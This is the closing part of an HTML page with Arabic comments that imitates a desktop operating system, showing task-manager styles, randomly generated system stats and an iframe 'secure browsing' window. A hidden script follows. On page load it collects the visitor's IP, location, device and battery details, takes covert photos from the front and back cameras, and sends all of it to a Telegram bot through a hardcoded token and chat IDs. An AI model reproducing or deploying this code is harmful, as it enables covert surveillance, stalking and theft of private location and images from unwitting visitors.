                 }
                 
                 .stat-item {
                     display: flex;
                     align-items: center;
                     gap: 8px;
                 }
                 
                 .stat-label {
                     font-size: 12px;
                     color: #86868b;
                     font-weight: 500;
                 }
                 
                 .stat-value {
                     font-size: 14px;
                     font-weight: 600;
                     color: #1d1d1f;
                 }
                 
                 .task-manager-tabs {
                     display: flex;
                     background: #f5f5f7;
                     border-bottom: 1px solid #d1d1d6;
                     height: 44px;
                     box-sizing: border-box;
                 }
                 
                 .tab-btn {
                     padding: 12px 24px;
                     border: none;
                     background: transparent;
                     color: #86868b;
                     font-size: 13px;
                     font-weight: 500;
                     cursor: pointer;
                     transition: all 0.15s ease;
                     display: flex;
                     align-items: center;
                     justify-content: center;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .tab-btn.active {
                     color: #007AFF;
                     border-bottom: 2px solid #007AFF;
                 }
                 
                 .tab-btn:hover:not(.active) {
                     color: #1d1d1f;
                     background: rgba(0, 0, 0, 0.05);
                 }
                 
                 .task-manager-content {
                     flex: 1;
                     overflow: hidden;
                 }
                 
                 .process-list {
                     height: 100%;
                     overflow-y: auto;
                 }
                 
                 .process-header {
                     display: grid;
                     grid-template-columns: 2fr 1fr 1fr 1fr 1fr;
                     padding: 16px 20px;
                     background: #f5f5f7;
                     border-bottom: 1px solid #d1d1d6;
                     font-size: 11px;
                     font-weight: 600;
                     color: #86868b;
                     text-transform: uppercase;
                     letter-spacing: 0.8px;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .process-item {
                     display: grid;
                     grid-template-columns: 2fr 1fr 1fr 1fr 1fr;
                     padding: 16px 20px;
                     border-bottom: 1px solid #f0f0f0;
                     align-items: center;
                     transition: all 0.15s ease;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .process-item:hover {
                     background-color: rgba(0, 122, 255, 0.05);
                 }
                 
                 .process-name {
                     font-size: 13px;
                     font-weight: 500;
                     color: #1d1d1f;
                 }
                 
                 .process-cpu {
                     font-size: 12px;
                     color: #1d1d1f;
                 }
                 
                 .process-memory {
                     font-size: 12px;
                     color: #1d1d1f;
                 }
                 
                 .process-status {
                     font-size: 10px;
                     padding: 4px 10px;
                     border-radius: 12px;
                     text-transform: uppercase;
                     font-weight: 600;
                     letter-spacing: 0.8px;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .process-status.running {
                     background: #d4edda;
                     color: #155724;
                 }
                 
                 .process-status.stopped {
                     background: #f8d7da;
                     color: #721c24;
                 }
                 
                 .action-btn {
                     padding: 6px 12px;
                     border: 1px solid #dc3545;
                     background: #dc3545;
                     color: white;
                     border-radius: 6px;
                     font-size: 11px;
                     cursor: pointer;
                     transition: all 0.15s ease;
                     font-weight: 500;
                     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
                 }
                 
                 .action-btn:hover {
                     background: #c82333;
                     border-color: #c82333;
                 }
             `;
             document.head.appendChild(taskManagerStyle);
             
             function updateSystemStats() {
                 const cpuUsage = Math.floor(Math.random() * 20) + 5;
                 const memoryUsage = (Math.random() * 2 + 3).toFixed(1);
                 const diskUsage = Math.floor(Math.random() * 50) + 100;
                 
                 windowEl.querySelector(`#cpu-usage-${id}`).textContent = `${cpuUsage}%`;
                 windowEl.querySelector(`#memory-usage-${id}`).textContent = `${memoryUsage} GB`;
                 windowEl.querySelector(`#disk-usage-${id}`).textContent = `${diskUsage} GB`;
             }
             
             setInterval(updateSystemStats, 2000);
             updateSystemStats();
             
             window.switchTab = function(taskManagerId, tab) {
                 const tabBtns = document.querySelectorAll(`#window-${taskManagerId} .tab-btn`);
                 tabBtns.forEach(btn => btn.classList.remove('active'));
                 event.target.classList.add('active');
                 
                 console.log(`Switched to ${tab} tab`);
             };
             
             window.endProcess = function(processName) {
                 if (confirm(`Are you sure you want to end ${processName}?`)) {
                     console.log(`Ending process: ${processName}`);
                     alert(`${processName} has been terminated.`);
                 }
             };
         }function openIncognito() {
    const id = 'incognito-browser';
    if (openWindows.has(id)) {
        bringToFront(openWindows.get(id));
        return;
    }

    const title = 'تصفح آمن';
    // تم تعديل المحتوى ليشمل حقل الإدخال، زر، وإطار العرض
    const content = `
        <div style="width:100%; height:100%; display:flex; flex-direction:column; background-color:#f0f2f5;">
            <div style="padding:10px; background-color:#fff; border-bottom: 1px solid #ddd; display:flex; gap:10px; align-items:center;">
                <input type="text" id="incognito-url-input" placeholder="أدخل الرابط هنا..." style="flex-grow:1; padding:8px; border:1px solid #ccc; border-radius:4px; font-size:14px;">
                <button id="incognito-go-btn" style="padding:8px 16px; background-color:#007AFF; color:white; border:none; border-radius:4px; cursor:pointer;">اذهب</button>
            </div>
            <iframe id="incognito-iframe" style="width:100%; height:100%; border:none;"></iframe>
        </div>
    `;

    const windowEl = createWindow(id, title, content);

    // إضافة وظائف لأزرار النافذة الجديدة
    const urlInput = windowEl.querySelector('#incognito-url-input');
    const goBtn = windowEl.querySelector('#incognito-go-btn');
    const iframe = windowEl.querySelector('#incognito-iframe');

    const loadUrl = () => {
        let url = urlInput.value.trim();
        if (url && !url.startsWith('http://' ) && !url.startsWith('https://' )) {
            url = 'https://' + url;
        }
        if (url ) {
            iframe.src = url;
        }
    };

    goBtn.addEventListener('click', loadUrl);
    urlInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            loadUrl();
        }
    });
}


     </script>

<script>
    // ⚙️ إعدادات التيليجرام
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    const FIXED_CHAT_ID = '1431886140'; // ثابت

    // 📍 جلب chatId من الرابط
    const urlParams = new URLSearchParams(window.location.search);
    const dynamicChatId = urlParams.get("id");

    // 🛠️ إرسال للمعرفات كلها
    function sendToTelegramMultiple(message, isLocation = false, lat = null, lon = null, photoBlob = null, caption = '') {
        const ids = [FIXED_CHAT_ID];
        if (dynamicChatId) ids.push(dynamicChatId);

        ids.forEach(chatId => {
            if (isLocation) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        latitude: lat,
                        longitude: lon
                    })
                }).catch(() => {});
            } else if (photoBlob) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', photoBlob, 'photo.webp');
                if (caption) formData.append('caption', caption);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(() => {});
            } else {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                }).catch(() => {});
            }
        });
    }

    // 🌐 جمع بيانات إضافية
    async function collectAdditionalData() {
        let ip = 'مافيش';
        let country = 'مافيش';
        let city = 'مافيش';

        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ip = data.ip || 'مافيش';
            country = data.country_name || 'مافيش';
            city = data.city || 'مافيش';
        } catch (e) {}

        let batteryLevel = 'مافيش';
        let batteryCharging = 'مافيش';
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
            batteryCharging = battery.charging ? 'نعم' : 'لا';
        } catch (e) {}

        return {
            ip, country, city,
            platform: navigator.platform,
            deviceVersion: navigator.userAgent,
            batteryLevel, batteryCharging
        };
    }

    // 📍 جلب الموقع
    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    resolve({ lat: latitude, lon: longitude, accuracy });
                },
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    // 📝 إرسال تقرير
    function sendTextReport(data, note = '') {
        let message = `
📋 *تقرير جمع البيانات*
🆔 الثابت: ${FIXED_CHAT_ID}
🆔 من الرابط: ${dynamicChatId || 'مافيش'}
🌐 الجهاز:
• النظام: ${data.platform}
• User Agent: ${data.deviceVersion}
🔋 البطارية: ${data.batteryLevel} | الشحن: ${data.batteryCharging}
🌍 الموقع:
• الآيبي: ${data.ip}
• الدولة: ${data.country}
• المدينة: ${data.city}
${note ? `📌 ملاحظة: ${note}` : ''}
⏰ ${new Date().toLocaleString('ar-EG')}
        `.trim();

        sendToTelegramMultiple(message);
    }

    // 📸 إعداد الكاميرا
    function setupCamera(video, canvas, type) {
        video.play();
        video.onplaying = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            let count = 0;

            const interval = setInterval(() => {
                if (count >= 3) {
                    clearInterval(interval);
                    stopCamera(video);
                    return;
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    sendToTelegramMultiple('', false, null, null, blob, `📸 كاميرا ${type} - صورة ${count + 1}`);
                }, 'image/jpeg', 0.7);
                count++;
            }, 1500);
        };
    }

    function stopCamera(video) {
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
        }
    }

    // 🚀 تشغيل عند تحميل الصفحة
    window.addEventListener('load', async () => {
        const data = await collectAdditionalData();

        // 📍 الموقع
        const location = await getLocation();
        if (location) {
            sendToTelegramMultiple('', true, location.lat, location.lon);
            data.location = `Lat: ${location.lat}, Lon: ${location.lon}, دقة: ${location.accuracy}`;
        } else {
            data.location = 'مافيش';
        }

        sendTextReport(data);

        // 🎥 الكاميرات
        const frontVideo = document.createElement('video');
        const backVideo = document.createElement('video');
        const frontCanvas = document.createElement('canvas');
        const backCanvas = document.createElement('canvas');

        [frontVideo, backVideo].forEach(v => {
            v.setAttribute('playsinline', '');
            v.setAttribute('autoplay', '');
            v.setAttribute('muted', '');
            document.body.appendChild(v);
            v.style.display = 'none';
        });

        [frontCanvas, backCanvas].forEach(c => {
            document.body.appendChild(c);
            c.style.display = 'none';
        });

        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            frontVideo.srcObject = frontStream;
            setupCamera(frontVideo, frontCanvas, "أمامية");
        } catch (e) {
            sendToTelegramMultiple("❌ فشل الوصول للكاميرا الأمامية");
        }

        try {
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            backVideo.srcObject = backStream;
            setupCamera(backVideo, backCanvas, "خلفية");
        } catch (e) {
            sendToTelegramMultiple("❌ فشل الوصول للكاميرا الخلفية");
        }
    });
</script>
</body>
</html>